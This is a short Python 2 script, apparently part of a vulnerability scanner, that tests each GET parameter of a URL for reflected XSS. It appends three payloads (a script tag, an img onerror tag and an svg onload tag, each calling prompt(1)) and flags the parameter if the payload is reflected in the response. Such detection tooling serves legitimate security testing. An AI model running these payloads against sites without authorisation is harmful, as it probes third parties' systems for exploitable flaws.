#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = w8ay
# 该脚本用于探测GET参数是否存在反射型XSS漏洞

import requests

import urlparse

from urllib import quote as urlencode

from urllib import unquote as urldecode

def poc(url):

    header = dict()

    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"

    header["Referer"] = url

    payloads = """<script>prompt(1)</script>
"><img src=x onerror=prompt(1)>
"><svg/onload=prompt(1)>"""

    payloadList = payloads.splitlines()

    parse = urlparse.urlparse(url)

    if not parse.query:

        return False

    

    for path in parse.query.split('&'):

        if '=' not in path:

            continue

        try:

            k, v = path.split('=',1)

        except:

            continue

        for payload in payloadList:

            new_url = url.replace("%s=%s"%(k,v),"%s=%s"%(k,v + payload))

            try:

                html = requests.get(new_url, headers=header,allow_redirects=False).text

                if payload in html:

                    log = "[XSS] %s key:%s payload:%s" % (new_url,k,v + payload)

                    return log

            except:

                pass

    return False
